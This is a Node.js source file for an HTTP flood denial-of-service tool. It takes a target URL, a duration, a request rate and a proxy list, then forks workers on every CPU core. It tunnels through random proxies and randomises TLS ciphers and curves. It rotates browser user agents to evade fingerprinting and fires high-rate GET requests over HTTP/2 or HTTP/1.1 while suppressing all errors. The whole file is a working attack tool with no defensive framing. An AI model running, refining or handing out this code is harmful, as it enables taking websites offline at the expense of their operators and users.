const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require('os');
const v8 = require("v8");
const https = require("https"); // Thêm module https cho HTTP/1.1
const setCookie = require('set-cookie-parser');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`node tls target time rate thread proxyfile`);
    process.exit();
}

const cplist = ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-CHACHA20-POLY1305'];

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";

const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1", "X25519:P-256:P-384:P-521"];

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_RENEGOTIATION;

const secureProtocol = "TLS_method";
const secureContextOptions = {
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    icecool: process.argv.includes('--icecool'), // icecool optimaze ram, cpu
    dual: process.argv.includes('--dual'), // dualhyper
};

const parsedTarget = url.parse(args.target);

const MAX_RAM_PERCENTAGE = 75;
const RESTART_DELAY = 3000;

const numCPUs = os.cpus().length; // Lấy số lượng core của hệ thống

if (cluster.isMaster) {
    console.clear();
    console.log(`target: ${process.argv[2]}`);
    console.log(`time: ${process.argv[3]}`);
    console.log(`rate: ${process.argv[4]}`);
    console.log(`thread: ${process.argv[5]}`);
    console.log(`proxyfile: ${process.argv[6]}`);
    console.log(`heap size: ${(v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2)}`);
    console.log(`icecool: ${args.icecool}, dual: ${args.dual}`);
    console.log(`Number of CPU cores: ${numCPUs}`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('Restarting in', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let i = 0; i < numCPUs; i++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('Max RAM usage reached:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    
    setInterval(handleRAMUsage, 10000);

    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);

} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    try {
        const content = fs.readFileSync(filePath, "utf-8");
        const lines = content.split(/\r?\n/).filter(line => line.trim().length > 0);
        console.log(`[Info] Successfully loaded ${lines.length} proxies from file`);
        return lines;
    } catch (error) {
        console.error(`[Error] Failed to read proxy file: ${error.message}`);
        process.exit(1);
    }
}

var proxies = readLines(args.proxyFile);

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function bexRandomString(min, max) {
    const length = randomIntn(min, max + 1);
    const mask = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => mask[Math.floor(Math.random() * mask.length)]).join('');
}

function sanitizePath(path) {
    return path.replace(/[^a-zA-Z0-9-_./]/g, '');
}

// Hàm tạo client HTTP/1.1 với maxSockets tăng cao
function createHttp1Client(parsedTarget, tlsBex) {
    const agent = new https.Agent({
        createConnection: () => tlsBex,
        maxSockets: 2000, // Tăng maxSockets lên 2000 để xử lý nhiều kết nối hơn
        timeout: 10000
    });

    return {
        request: (options, callback) => {
            const req = https.request({
                ...options,
                agent: agent,
                method: "GET",
                path: parsedTarget.path,
                headers: options.headers,
            }, callback);
            req.end();
            return req;
        },
        destroy: () => {
            agent.destroy();
        }
    };
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 EdgA/120.0.0.0",
        "Mozilla/5.0 (Linux; Android 14; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 EdgA/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone 15; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    ];
    const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

    let path = parsedTarget.path.replace("%RAND%", bexRandomString(12, 20));
    path = sanitizePath(path);

    const targetUrl = new URL(args.target);
    const headersbex = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": path,
        "user-agent": getRandomUserAgent(),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "upgrade-insecure-requests": "1",
        "referer": targetUrl.href,
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: randomElement(cplist),
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: randomElement(ecdhCurve),
            secureContext: secureContext,
            honorCipherOrder: true,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };

        const tlsBex = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsBex.allowHalfOpen = true;
        tlsBex.setNoDelay(true);
        tlsBex.setKeepAlive(true, args.time * 1000);
        tlsBex.setMaxListeners(0);

        // Ngẫu nhiên chọn giữa HTTP/2 và HTTP/1.1 (tỷ lệ 60% HTTP/2, 40% HTTP/1.1)
        const useHttp2 = Math.random() < 0.6; // Có thể thay đổi tỷ lệ tại đây
        let client;

        if (useHttp2) {
            client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                createConnection: () => tlsBex,
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxFrameSize: 16384,
                    enablePush: false,
                },
            });
        } else {
            client = createHttp1Client(parsedTarget, tlsBex);
        }

        const requestRate = args.dual ? args.Rate * 2 : args.Rate;
        const requestInterval = args.icecool ? Math.floor(1000 / requestRate) + randomIntn(100, 200) : 1000 / requestRate;
        const IntervalAttack = setInterval(() => {
            for (let i = 0; i < requestRate; i++) {
                if (useHttp2) {
                    const bex = client.request(headersbex)
                        .on('response', () => {
                            bex.close();
                            bex.destroy();
                        });
                    bex.end();
                } else {
                    client.request({
                        path: path,
                        headers: headersbex,
                    }, (res) => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                }
            }
        }, requestInterval);

        setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);

        if (useHttp2) {
            client.on("close", () => {
                client.destroy();
                connection.destroy();
            });
            client.on("error", () => {
                client.destroy();
                connection.destroy();
            });
        } else {
            setTimeout(() => {
                client.destroy();
                connection.destroy();
            }, args.time * 1000);
        }
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);